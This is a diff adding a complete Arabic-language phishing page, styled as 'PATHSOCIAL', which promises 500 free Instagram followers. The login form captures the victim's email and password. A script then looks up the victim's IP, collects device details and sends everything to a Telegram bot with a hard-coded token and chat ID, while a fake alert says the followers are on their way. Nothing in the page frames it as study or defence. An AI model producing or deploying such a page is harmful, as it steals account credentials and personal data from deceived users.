@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>متابعين إنستغرام مجاناً</title>
+  <link rel="stylesheet" href="h.css">
+</head>
+<body>
+  <header>
+    <div class="header">
+      <h1>PATHSOCIAL</h1>
+      <nav>
+        <a class="a1" href="index.html">ابدأ الآن</a>
+      </nav>
+    </div>
+  </header> 
+
+  <div class="div1">
+    <div class="div2">
+      <form id="login-form">
+        <h1 class="h0">Instagram</h1>
+        <h1 class="h1">احصل على 500 متابعين مجاناً</h1>
+        <input class="in1" type="text" id="email" placeholder=" الاميل " required>
+        <br>
+        <input class="in1" type="password" id="password" placeholder="كلمة المرور" required>
+        <br>
+        <input class="in2" type="submit" value="تسجيل دخول">
+      </form>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "7800116453:AAEZVYvN0F1T9pr9xa6HnCzG5GpuoEAahy8"; // هنا التوكين
+    const CHAT_ID = "6662219429"; // هنا معرف الشات
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('  سيصلك المتابعين بعد 30 دقيقة!');
+                }).catch(error => {
+                    alert('حدث خطأ أثناء إرسال المعلومات. حاول مرة أخرى.');
+                });
+            })
+            .catch(error => {
+                alert('حدث خطأ أثناء جلب عنوان الـ IP. حاول مرة أخرى.');
+            });
+    });
+  </script>
+</body>
+</html>
